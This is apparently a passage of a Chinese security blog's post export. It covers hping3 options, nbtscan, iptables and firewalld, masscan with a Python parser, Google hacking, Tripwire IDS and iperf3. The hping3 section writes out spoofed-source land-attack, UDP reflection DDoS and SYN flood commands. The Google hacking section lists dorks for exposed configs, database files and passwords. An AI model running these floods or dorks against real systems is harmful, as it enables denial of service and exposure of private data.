//更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。 -f --frag 拆分数据包更多的frag. (may pass weak acl) //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。 -x --morefrag 设置更多的分段标志 // 大量碎片，泪滴攻击。 -y --dontfrag 设置不分段标志 // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。 -g --fragoff set the fragment offset // 设置断偏移。 -m --mtu 设置虚拟最大传输单元, implies --frag if packet size > mtu // 设置虚拟MTU值，当大于mtu的时候分段。 -o --tos type of service (default 0x00), try --tos help // tos字段，缺省0x00，尽力而为？ -G --rroute includes RECORD_ROUTE option and display the route buffer // 记录IP路由，并显示路由缓冲。 --lsrr 松散源路由并记录路由 // 松散源路由 --ssrr 严格源路由并记录路由 // 严格源路由 -H --ipproto 设置IP协议字段，仅在RAW IP模式下使用 //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。 ICMP 模式 -C --icmptype icmp类型(默认echo请求) // ICMP类型，缺省回显请求。 -K --icmpcode icmp代号(默认0) // ICMP代码。 --force-icmp 发送所有icmp类型(默认仅发送支持的类型) // 强制ICMP类型。 --icmp-gw 设置ICMP重定向网关地址(默认0.0.0.0) // ICMP重定向 --icmp-ts 等同 --icmp --icmptype 13 (ICMP 时间戳) // icmp时间戳 --icmp-addr 等同 --icmp --icmptype 17 (ICMP 地址子网掩码) // icmp子网地址 --icmp-help 显示其他icmp选项帮助 // ICMP帮助 UDP/TCP 模式 -s --baseport base source port (default random) // 缺省随机源端口 -p --destport [+][+]&lt;port> destination port(default 0) ctrl+z inc/dec // 缺省随机源端口 -k --keep keep still source port // 保持源端口 -w --win winsize (default 64) // win的滑动窗口。windows发送字节(默认64) -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4) // 设置伪造tcp数据偏移量(取代tcp地址长度除4) -Q --seqnum shows only tcp sequence number // 仅显示tcp序列号 -b --badcksum (尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。 -M --setseq 设置TCP序列号 -L --setack 设置TCP的ack ------------------------------------- (不是 TCP 的 ACK 标志位) -F --fin set FIN flag -S --syn set SYN flag -R --rst set RST flag -P --push set PUSH flag -A --ack set ACK flag ------------------------------------- （设置 TCP 的 ACK 标志 位） -U --urg set URG flag // 一大堆IP抱头的设置。 -X --xmas set X unused flag (0x40) -Y --ymas set Y unused flag (0x80) --tcpexitcode 使用last tcp-> th_flags作为退出码 --tcp-mss 启用具有给定值的TCP MSS选项 --tcp-timestamp 启用TCP时间戳选项来猜测HZ/uptime Common //通用设置 -d --data data size (default is 0) // 发送数据包大小，缺省是0。 -E --file 文件数据 -e --sign 添加“签名” -j --dump 转储为十六进制数据包 -J --print 转储为可打印字符 -B --safe 启用“安全”协议 -u --end 告诉你什么时候--file达到EOF并防止倒回 -T --traceroute traceroute模式(等同使用 --bind 且--ttl 1) --tr-stop 在traceroute模式下收到第一个不是ICMP时退出 --tr-keep-ttl 保持源TTL固定，仅用于监视一跳 --tr-no-rtt 不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定） ARS packet description (new, unstable) --apd-send 发送APD描述数据包(参见docs / APD.txt) 常用模式 -0 --rawip # IP原始报文 -1 --icmp # ICMP模式 -2 --udp # UDP模式 -8 --scan # 扫描模式 -9 --listen # 监听模式 常用方式## SYN方式扫描主机端口 hping --scan 1-30,70-90 -S www.target.host hping --scan 445,135 -S 192.168.0.110 #目标主机回复的 'S..A'，代表SYN/ACK ## 测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击(DoS attack)。 #例如，以LandAttack方 式测试目标防火墙(Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接)。 # -a 伪造源地址 hping3 -S -a 114.114.114.114 -p 53 114.114.114.114 -c ## DRDDOS(UDP反射DDoS攻击) -c发包的数量 hping3 --udp -a 114.114.114.114 -p 53 114.114.114.114 -c 5 使用hping3进行flood DoS攻击： hping3 -c 5000 -d 150 -S -w 64 -p 80 --flood &lt;10.0.40.246> -c：发送数据包的个数 -d：每个数据包的大小 -S：发送SYN数据包 -w：TCP window大小 -p：目标端口，你可以指定任意端口 --flood：尽可能快的发送数据包 --rand-source :使用随机的Source IP Addresses. document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>hping3</tag>
        <tag>端口扫描</tag>
        <tag>DDOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nbtscan]]></title>
    <url>%2Fposts%2F26997%2F</url>
    <content type="text"><![CDATA[当我们处于局域网中 用来探测内网存活主机 kali中已经安装了： root@xps:~# whereis nbtscan nbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz root@xps:~# nbtscan NBTscan version 1.6. This is a free software and it comes with absolutely no warranty. You can use, distribute and modify it under terms of GNU GPL 2+. Usage: nbtscan [-v] [-d] [-e] [-l] [-t timeout] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range>) -v verbose output. Print all names received from each host -d dump packets. Print whole packet contents. -e Format output in /etc/hosts format. -l Format output in lmhosts format. Cannot be used with -v, -s or -h options. -t timeout wait timeout milliseconds for response. Default 1000. -b bandwidth Output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that ougoing queries don't get dropped. -r use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix. -q Suppress banners and error messages, -s separator Script-friendly output. Don't print column and record headers, separate fields with separator. -h Print human-readable names for services. Can only be used with -v option. -m retransmits Number of retransmits. Default 0. -f filename Take IP addresses to scan from file filename. -f - makes nbtscan take IP addresses from stdin. &lt;scan_range> what to scan. Can either be single IP like 192.168.1.1 or range of addresses in one of two forms: xxx.xxx.xxx.xxx/xx or xxx.xxx.xxx.xxx-xxx. Examples: nbtscan -r 192.168.1.0/24 Scans the whole C-class network. nbtscan 192.168.1.25-137 Scans a range from 192.168.1.25 to 192.168.1.137 nbtscan -v -s : 192.168.1.0/24 Scans C-class network. Prints results in script-friendly format using colon as field separator. Produces output like that: 192.168.0.1:NT_SERVER:00U 192.168.0.1:MY_DOMAIN:00G 192.168.0.1:ADMINISTRATOR:03U 192.168.0.2:OTHER_BOX:00U ... nbtscan -f iplist Scans IP addresses specified in file iplist. # 参数 -a 列出为其主机名提供的远程计算机名字表。 -A 列出为其IP地址提供的远程计算机名字表。 -c 列出包括了IP地址的远程名字高速缓存器。 -n 列出本地NetBIOS名字。 -r 列出通过广播和WINS解析的名字。 -R 消除和重新加载远程高速缓存器名字表。 -S 列出有目的地IP地址的会话表。 -s 列出会话表对话。 示例## 以：分割显示 ## Linux上 nbtscan -v -s : 192.168.117.130 # 扫描整个C段 nbtscan -r 192.168.1.0/24 # 扫描一个范围 nbtscan 192.168.1.25-137 # 从文件读取扫描范围 nbtscan -f &lt;File> ## Windows上 nbtscan.exe -m 192.168.1.0/24 高级用法nbtscan -v -s ' ' 192.168.117.130 nbtscan -v -s ' ' 192.168.117.130 | awk '{print $1}' |uniq 这个工具的运行流程：遍历输入的IP范围，以广播MAC地址发送ARP查询，一旦接收到ARP回复，遍记录相应的IP与MAC地址，同时向对方发送NBNS消息查询对方的主机信息打印出每条信息 其他探测内网主机的方法：http://www.360doc.com/content/19/1129/18/13328254_876375955.shtml document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>nbtscan</tag>
        <tag>主机存活探测</tag>
        <tag>网络工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables包过滤与网络地址转换]]></title>
    <url>%2Fposts%2F23022%2F</url>
    <content type="text"><![CDATA[iptables功能4个表raw和mangle，nat,filter（后两个表用的多） iptables -t filter -nvL # -t显示哪个表 三个链(Chain)：INPUT,FORAWRD(转发规则链),OUTPUT 特点 比较老,逐渐被取代 基于命令行 难度最高 用法iptables [-t 表名] 选项 [链名] [条件] [-j 控制类型] # 注意事项： 不指定表名时，默认指filter表 不指定链名时，默认只表内是所有链 除非设置链的默认策略。否则必须指向匹配条件 选项、链名、控制类型使用大写字母，其余均为小写 几种控制类型 ACCEPT # 允许流量通过 REJECT # 明确拒绝(比如ping时候的"主机不可达") DROP # 对方不知道你是否在线(显示超时) LOG # 记录日志信息 规则优先顺序：自上而下 包过滤用法 iptables -L # 显示所有的策略 iptables -F # "清空所有"策略 iptables -F FORWARD # 清空FORWARD表所有规则 iptables -P INPUT DROP # 默认禁止所有流量策略,不能reject ## 参数 -I # 插入到最前面(用的较多) -A # 插入到最后面(用的较少) -D # 删除 -p # 允许的协议 --dport # 本机端口（属于隐含匹配，要配合通用匹配使用） -s # 来源地址 -d # 目的地址 -i # 入站网卡 -o # 出站网卡 -j # 本身为意义，后面跟动作 -L # 列出所有规则条目 -n: # 以数字形式显示地址、端口等信息 -v: # 以更详细的方式显示规则信息 --lines-numbers: # 查看规则时，显示规则的序号 -mac-source MAC地址 # MAC地址匹配（属于显式匹配） iptables -I INPUT -p icmp -j ACCEPT #只允许外部到内部的ping iptables -I INPUT -s 192.168.10.0/24 -d 0.0.0.0 -p tcp --dport 22 #允许来自某个网段的访问，端口为22 -D #删除某一条 iptables -D INPUT 1 #删除第一条(后面跟行号) iptables -I INPUT -p tcp --port 22 -j REJECT #禁止外部所有22端口的流量 iptables -I INPUT -p tcp --port 22:200 -j REJECT #禁止外部所有20到200端口的流量 # 保存规则（永久生效） service iptables save # 导出当前规则状态 iptables-save > /usr/share/1.txt # 从文件导入规则 iptables-restore &lt; /usr/share/1.txt 网络地址转换(NAT) NAT表 # 查看NAT表规则 iptables -t nat -nvL 路由后规则（POSTROUTING） ## 设置规则 # -s 是给内网的谁做转换, --to-source是转为网关的地址 iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source 12.34.56.78 # 如果网关地址是动态的，就这样 iptables -t nat -A POSTROUTING -p tcp -o eth1 -s 192.168.1.0/24 -j SNAT --to-source -j MASQUERADE ## 配置FORWARD链的转发限制 目标地址转换(DNAT) 情景：外网机器访问内网机器 使用链：路由前规则（PREROUTING） # 查看NAT表规则 iptables -t nat -nvL # 设置规则，访问内网主机的8080端口（网关的80映射到内网主机的8080） iptables -t nat PREROUTING -i eth1 -d 12.34.56.78 -p tcp --dport 80 -J DNAT --to-destination 192.168.1.1:8080 firewalld 防火墙zone #区域 sbit #安全位 public #默认策略,当前使用 Runtime # 当前生效，重启后失效 Premanent # 当前暂时不生效，但是永久生效 --premanent # 建议添加这个 firewall-cmd -reload #重启 firewall-cmd --get-default-zone #查看当前区域 firewall-cmd --set-default-zone=drop #切换默认区域到丢包 firewall-cmd --permanent --zone=drop --change-interface=en0167777 #重启之后，把这个网卡区域换为drop firewall-cmd --permanent get-zone-of-interface=en0167777 #重启之后，查看 ##紧急模式 firewall-cmd --panic-on #切断所有网络连接，包括ping的数据包 firewall-cmd --panic-off #关闭紧急模式 ##查询服务 firewall-cmd --zone=public --query-service=http #查看是否允许http firewall-cmd --zone=public --query-service=ssh ##添加允许服务 firewall-cmd --zone=public --add-servcice=http #允许从外访问http服务 firewall-cmd --zone=public --add-servcice=https #重启才可以 firewall-cmd --reload firewall-cmd --zone=public --add-servcice=https ##禁止服务 firewall-cmd --zone=public --remove-servcice=https firewall-cmd --permanent --zone=public --add-servcice=https firewall-cmd --permanent --zone=public --query-servcice=https ##添加端口号 firewall-cmd --zone=public --add-port=8080/tcp #把这个端口添加到tcp协议组，允许 firewall-cmd --zone=public --add-port=80-90/tcp #端口端 ##端口转发（隐藏原始端口） firewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #转发888到22 firewall-cmd --reload ##复规则（复规则） ##精准匹配 firewall-cmd --permanent --zone=public --add-rich-rule="rule family"="ipv4" source address="192.168.10.0/24" service name="ssh" reject" firewall-cmd reload document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>iptables</tag>
        <tag>NAT</tag>
        <tag>防火墙</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[masscan]]></title>
    <url>%2Fposts%2F39667%2F</url>
    <content type="text"><![CDATA[masscan号称是世界上最快的扫描软件，可以在3分钟内扫描整个互联网端口，但是这个是由条件的4核电脑，双端口10G网卡 项目地址： https://github.com/robertdavidgraham/masscan 安装Linux上sudo apt-get install git gcc make libpcap-dev git clone https://github.com/robertdavidgraham/masscan cd masscan make Windows上因为我用的Linux比较多，所用没安过Windows的，请参考：https://www.cnblogs.com/flaray/p/11213730.html 使用常用命令masscan 172.16.0.0/16 -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # 扫描ip列表文件 masscan -iL ip.txt -p0-65535 --banners --append-output -oL scan_result.list --max-rate 10000 # 输出json格式 -Oj masscan -iL ip.txt -p80,443,3306 --banners --append-output -oJ result.json --max-rate 10000 # Note: 发包速率(--max-rate)不要太大，且Linux下比Windows速度快 --adapter-ip # 指定发包的IP地址 --adapter-port # 指定发包的源端口 --adapter-mac # 指定发包的源MAC地址 --router-mac # 指定网关的MAC地址 --exclude # IP地址范围黑名单,防止masscan扫描 --excludefile # 指定IP地址范围黑名单文件 --includefile,-iL # 读取一个范围列表进行扫描 --wait # 指定发送完包之后的等待时间,默认为10秒 Python脚本解析masscan扫描结果 是基于json输出格式(-OJ)的 # Author：https://www.jianshu.com/p/b6edaa3acbbf import json from openpyxl import Workbook import xlsxwriter import socket def get_list(filepath): f = open(filepath,encoding='utf-8') c = json.load(f) list = [] for i in c: ip = i['ip'] port = str(i['ports'][0]['port']) status = 'open' try: if i['ports'][0]['service']: name = i['ports'][0]['service']['name'] banner = str(i['ports'][0]['service']['banner']) except: name = '' banner = '' line = [ip,port,status,name,banner] list.append(line) return list def quchong(l1): l2 =[] for data1 in l1: for data2 in l1: if data1[0]==data2[0] and data1[1]==data2[1]: if data1[3] ==''and data2[3] !='': # print(data1,data2) l2.append(data1) for i in l2: try: l1.remove(i) except:pass l1 = [list(t) for t in set(tuple(_) for _ in l1)] return l1 def write_excle(list): f = xlsxwriter.Workbook('port.xlsx') worksheet1 = f.add_worksheet('扫描信息') worksheet2 = f.add_worksheet('主机ip列表') worksheet1.write(0, 0, 'ip') worksheet1.write(0, 1, '端口') worksheet1.write(0, 2, '状态') worksheet1.write(0, 3, '服务') worksheet1.write(0, 4, 'banner') worksheet2.write(0, 0, '主机ip') newlist= [] for i in list: newlist.append(i[0]) newlist=set(newlist) total1 = 0 total2 = len(newlist) newlist=sorted(newlist, key=socket.inet_aton) for index, p in enumerate(list): total1+=1 for j, q in enumerate(p): worksheet1.write(index + 1, j, q) for index, p in enumerate(newlist): worksheet2.write(index + 1, 0, p) f.close() return total1,total2 if __name__ == '__main__': filepath = 'C:/1/result.json' #填写要解析masscan扫描json格式报告的文件路径 result = get_list(filepath) result = quchong(result) sum = write_excle(result) print('共检测到存活主机%d个，端口信息%d条'% (sum[1],sum[0])) document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>端口扫描</tag>
        <tag>masscan</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google Hacking]]></title>
    <url>%2Fposts%2F3409%2F</url>
    <content type="text"><![CDATA[基本通配符 通配符 语义 说明 示例 + 包含关键词 +前面必须要有一个空格 admin +login - 排除关键词 -前面必须要有一个空格 mysql -csdn ~ 同义词 ~前面必须要有一个空格 mysql -csdn * 模糊查询 *代替任意字符 mysql** "" 强调 "mysql" 高级操作符概述将学习如下的高级操作符： intitle, allintitle related inurl, allinurl phonebook filetype rphonebook allintext bphonebook site author link group inanchor msgid daterange insubject cache stocks info define 操作符语法基本语法：operator:search_term 原则 在操作符、冒号、搜索关键字之间是没有空格的； 布尔操作符和特殊字符(例如OR和+)仍可用于高级操作符查询，但是不能把它们放在冒号之前而把冒号和操作符分开； ALL操作符(以单词ALL开头的操作符)非常古怪。一般情况下，一个查询中只能使用一次ALL操作符，而且不能和其他操作符混用； 操作符搜索的搜索关键字部分的语法和前一章中讲到的关键字语法是一样的。 例如，你可以使用一个单词或者用引号引起来的词组作为关键字。如果用词组作为关键字的话，须保证在操作符、冒号和词组的第一个引号之间没有任何空格字符。 实例 intitle:Google这个查询将返回标题包含单词Google的页面。 intitle:"index of"这个查询将返回标题包含词组index of的页面。回忆前一章中学到的知识，我们可以知道这个查询也可以写成 intitle:index.of,因为句号可以匹配任意字符。利用这种技术，我们可以避免键入词组中的空格以及两端的引号。” intitle:"index of" private 这 个查询将返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含单词private的页面。要注意的是，intitle 只对词组index of起作用，而不会影响单词private,这是因为引号外的第一个空格位于词组index of之后。Google把这个空格解释为高级操作符搜索关键字的结尾，然后接着处理查询中剩下的部分。 intitle:"index of" "bakcup files"这 个查询返回标题包含词组index of,且网页的任何地方(URL、标题、文本等)包含词组backup files的 页面。同样要注意到intitle仅对词组index of起作用。 正文Intitle 与 Allintitle ：在页面标题中搜索ps：只有在单词intitle后面的单词或词组才被认为是查询关键字，而Allintitle没有这一规则 例如： intitle:"index of" "backup files" Allintitle:"index of" "backup files" 每个链接的文档标题中都找到了两个词，更精确 慎重使用allintitle操作符。在和其他高级操作符一起使用时，它就显得非常笨拙，而且会打乱整个查询，使得无法得到结果。也许有些极端，但是即便在一次查询中使用一-串intitle也好过使用拙劣的allintitle. intext 与 Allintext ：在网页内容里查找字符串由于这个操作符是以单词all开头的，所以在它之后的每个搜索关键字都将作为查询语句的一部分。 基于这个原因，alintext操作符不能和其他的高级符混合使用。 Inurl 与 Allinurl ：在URL中查找文本Site ：把搜索精确到特定的站点注意：Google是从左到右读取服务器名的 Filetype ：搜索指定类型的文件filetype:pdf 常见的文件拓展名： pdf ps wk1, wk2, wk3, wk5, wki, wks, wku Lwp Mw Xls Ppt Doc wks, wps, wdb Wri Rtf Swf ans, txt html htm php asp cfm aspx jsp CGI DO PL XML DOC PHTML PHP3 TXT EXE XLS PPT 提示：ext操作符可以用来替代filetype. filetye:xls查 询与ext:xIs等价。 Link ：搜索与当前网页存在链接的网页link:www.baidu.com Inanchor ：在链接文本中查找文本可以和link操作符相比较使用，因为都能用来搜索链接。但是inachor操 作符搜索的是一个链接的文本表示，而不是实际的URL 。 inanchor 操作符搜索的是锚点，或者说是链接上显示的文本 Cache ：显示网页的缓存版本Numrange ：搜索数字numrang操作符需要两个参数，一个是最小数，一个是最大数，以破折号分隔。 例如，查找12345：numrange:12344-12346或简写12344..12346 Daterange ：查找在某个特定日期范围内发布的网页这个操作符的参数通常也必须表示为一个范围，即用破折号分开的两个日期。如果你只想查找某个特定日期索引的网页，必须提供同样的日期两次，并以破折号分开。 Info ：显示Google的摘要信息该操作符的参数必须是: 一个有效的URL或者网站名。 Related ：显示相关站点Author ：搜索Groups中新闻组帖子的作者Group ：搜索Group标题可以用来在Google Groups帖子的标题中搜索含有关键字的帖子。 group操作符并不能很好地和其他操作符混合使用。 Insubject ：搜索Google Group主题行insubject操作符实际上和intitle搜索是一样的，它们返回同样的结果。 as_Msgid ：通过消息ID来查找Group帖子Stocks ：搜索股票信息这个操作符的参数必须是一个有效的股票简称 stocks操作符不能和其他的操作符 及搜索关键字同时使用。 Define ：显示某个术语的定义 define操作符不能和其他操作符或搜索关键字混合使用。 Phonebook ：搜索电话列表phonebook操作符可以用来搜索商业和住宅电话列表。 例如：phonebook: john ny是johb在 view ：以什么形式展示在Web查询的结尾放上view:map或者yview:timeline，以便在地图视图或者一个酷酷的时间轴视图中查看结果。 其他操作符。。。。。。 操作符的混合使用 基础使用缓存进行匿名浏览可以实现匿名浏览，如果配合代理服务器效果更好：通过语法查找inurl:"nph-prxy.cgi "start browsing"等 选项cached text only其实是添加了换一个&amp;strip=1参数，强制只显示缓存文本，禁止任何外部引用 Google的缓存版本页面会对搜索关键字进行高亮显示。但是你可能还不知道可以使用Google的高亮工具在缓存网页中高亮显示某些并不包含在原始搜索中的关键字。 目录列表查找目录列表：intitle:"index.of" "parent directory" 其中.是通配符 查找特定目录：intitle:index.of.admin或intitle:index.of inurl:admin 查找特定的文件：filetype:log inurl:ws_ftp.log，使用filetype和inurl来查找 服务器版本：intitle:index.of server at 服务器版本：intitle:index.of Apache/1.3.24 Server at 等（其他服务器…） 搜索目标是否有列目录 site:"xpshuai.cn" intext:index of/ | ../ | Parent Directory 遍历目录遍历：intitle:index.of inurl:"/admin/"和intitle:index.of inurl:"/var/www/"等等 递增置换（“取一个数并用下一个更大的或者更小的数来替代这个数”的形象的说法） 拓展遍历（用于查找文件名相同，但是拓展名不同的文件如备份文件–&gt;一旦你找到了HTM文件，就可以应用置换技术来查找具有相同的文件名，但扩展名不同的文件） 文档加工与数据库挖掘配置文件inurl:conf OR inurl:config OR inurl:cfg Google黑客在搜索配置文件时常考虑的几点：●使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索。●过滤掉sample. example、 test. howto和tutorial单 词以剔除明显的示例文件。升5 6 sm●用-cvs过滤掉CVS存储器，它们通常存放了默认的配置文件。●如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual（-manpage）●搜索示例配置文件中最常改变的域，并且对该域执行缩简搜索，以剔除可能的“垃圾”或者样例文件。 常见的配置文件搜索示例： 日志文件例如：filetype:log username putty Office文档搜索可能敏感的Office文档的查询样例： 数据库挖掘登录入口不管登录入口的安全强弱程度如何，它的存在都暴露了目标可能使用的软件和硬件的类型。简单来说，登录入口非常适合于顺藤摸瓜。 帮助文件错误消息 数据库转储 实际的数据库文件如：filetype"mdb inurl:user.mdb 其他信息搜索确定E-mail地址1.查找邮件服务器：host -t mx qq.com 、 Windows上：nslookup -Cqtype=mx qq.com 2.挑选出一个服务器，并且远程登录到端口25：telnet mx1.qq.com 25 3.伪装简单邮件传送协议(SMTP) 4.正面测试 5.反面测试 6.完成，可以确定某个邮箱存在 确定电话号码通过Google的数字范围(numrange)操作符在一个特定的范围内查找包含的电话号码 先指定起始数字，接着键入..，再键入终止数字。 确定人特殊的操作符filetype:ppt site:www.****.gov 搜索exp与查找目标搜索公开的exp站点如：filetype:c exploit 然后分离url：grep cached exp |awk-F "-" '{print $1}'| sort -u 通过常见代码字符串搜索exp利用Google代码搜索查找代码搜索恶意软件和可执行文件利用源代码搜索目标简单有效的安全性搜索 error | warning login | logon username |userid |employee.ID | "your username is" password | "your password is" site:edu.cn # -ext 必须和site一起用 site:edu.cn -ext:html # 排除html的文件类型 # 临时文件、备份目录 inurl:tmp | inurl:temp | inurl:backup | inurl:bak 跟踪搜索Web服务器、登录入口和网络硬件定位并剖析Web服务器1.目录列表 2.Web服务器软件的错误消息 3.默认文档 4.示例程序 用户名、口令和其他秘密信息搜索用户名 搜索口令 信用卡账号 社保号码 个人财务数据 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Google hacking</tag>
        <tag>搜索引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-入侵检测IDS]]></title>
    <url>%2Fposts%2F35785%2F</url>
    <content type="text"><![CDATA[入侵检测(IDS) 安全的关键在于看见 入侵检测( Intrusion Detection System ) 设备或者软件， 用于监视网络和系统的恶意、违规行为 基于特征、基于异常(流量异常，行为异常..)、基于信誉(依赖机器学习) 基于网络的入侵检测 NIDS 基于主机的入侵检测 HIDS (常用的方法：检查系统文件的完整性) 告警而非实时阻断(联动其他手段实现阻断) 监视和警告文件/目录的变更 IPS(入侵防御系统) / IDP（入侵检测防御系统） Tripwire(绊网) 开源免费的安全和数据完整性检测及告警软件(有企业版) Tripwire 公司 军事和工业领域 Tripwire 基于文件完整性检查的HIDS 对全新安装的系统创建基线库 基于策略生成基线和检查指定文件目录的指定属性(HASH、 Perm、Owner) 安装 sudo apt-get install tripwire # 同时会提示你安装Postfix # 要求你设置密码文（两个密钥对 对文件完整性做签名） # site key 一组服务器主机 相同的site key，适用于重复使用 # local key 只针对我本机的文件加密的情景 # 配置文件会以key加密方式保存的，如果想修改可以修改/etc/tripwire/twcfg.txt然后执行命令来实现 # 要监视的文件目录的策略文件：/etc/tripwire/twpol.txt 文件结构 ls /etc/tripwire site.key xps-local.key tw.cfg # 加了密的 twcfg.txt # 配置文件。 tw.pol twpol.txt # 策略文件。rulename 策略名 # 其中变化很大的文件要根据情况来进行监控 # 可以在策略文件，自己添加新的规则 初始化数据库 ls /var/ib/tripwire/ # 存放文件完整性的数据库 sudo tripwire --init # 要先进行数据库初始化 No such file or directory # 会有这个提示信息，Error就不正常了（有的文件不存在） vi /etc/tripwire/twpol.txt # 要注释所有不存在的文件/目录 sudo twadmin -m P /etc/tripwire/twpol.txt # 然后基于修改之后的策略文件，重新生成pol文件 sudo tripwire --init #重新初始化数据库 检查验证 sudo tripwire --check # 检查 # 查看验证结果 添加规则 vi /etc/tripwire/twpol.txt # Rules for Project { rulename = "Project Ruleset", severity = $(SIG_ HI) } { /project -> $(SEC CRIT); } sudo twadmin -m P /etc/tripwire/twpol.txt # 先创建上面策略文件中的文件，否则会报错文件不存在 # 重新初始化数据库 sudo tripwire --init 基于上次最新的检查日志(增量型的方式)，来进行更新 ##更新数据库(本地系统更新) ll /var/lib/tripwire/report # 每次数据库变更都要执行一次 tripwire -mu-a -S -C /etc/tripwire/tw.cfg -r /var/ib/tripwire/report/xps.twr # 或者使用下面这个方式，一次执行即可 tripwire --update -- accept-all ## 查看报告（r 读取。这样的方法更加详细） twprint -m r -F /var/lib/tripwire/report/xps-2020801-100037.twr ## 查看数据库(d 数据。内容很多) twprint -m d -d /path/to/database.twd 补充命令硬件信息 # 安装 sudo apt install Ishw # 查看 sudo lshw # 输出结果 sudo lshw -html > hwinfo .html 硬盘信息 # 安装 sudo apt install hdparm hdparm -i /dev/sda hdparm -I /dex/sda # 更加详细信息 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>IDS</tag>
        <tag>Tripwire</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-网络工具]]></title>
    <url>%2Fposts%2F63455%2F</url>
    <content type="text"><![CDATA[网络带宽 开测试防火墙性能NetIO 光纤专线的带宽是否缩水 实际承受的流量 iperf3 模拟出来的流量并非真实带宽 测试网络带宽iperf3 支持TCP/SCTP/UDP协议 跨平台 多连接(模拟多用户) 支持IPv6 安装 # 服务端和客户端都是这一个软件包 apt install iperf3 # 默认侦听端口：5201 参数 # iperf3 -p, --port # server port to listen on/connect to -f, --format #[kmgKMG] format to report: Kbits, Mbits, KBytes, MBytes -i, --interval # seconds between periodic bandwidth reports -F, --file name # xmit/recv the specified file， 指定文件打到对方 -A, --affinity n/n,m set CPU affinity -B, --bind &lt;host> bind to a specific interface -V, --verbose more detailed output -J, --json output in JSON format --logfile f send output to a log file -d, --debug emit debugging output -v, --version show version information and quit -h, --help show this message and quit Server specific: -s, --server run in server mode -D, --daemon run the server as a daemon # 后台运行 -I, --pidfile file write PID file -1, --one-off handle one client connection then exit # 只接收第一个客户端的测试 Client specific: -c, --client &lt;host> run in client mode, connecting to &lt;host> -u, --udp #use UDP rather than TCP -b, --bandwidth #[KMG][/#] target bandwidth in bits/sec (0 for unlimited) # 限制流量带宽 (default 1 Mbit/sec for UDP, unlimited for TCP) (optional slash and packet count for burst mode) -t, --time # time in seconds to transmit for (default 10 secs) # 测试时长(默认10s) -n, --bytes #[KMG] number of bytes to transmit (instead of -t) -k, --blockcount #[KMG] number of blocks (packets) to transmit (instead of -t or -n) -l, --len #[KMG] length of buffer to read or write (default 128 KB for TCP, 8 KB for UDP) --cport &lt;port> bind to a specific client port (TCP and UDP, default: ephemeral port) -P, 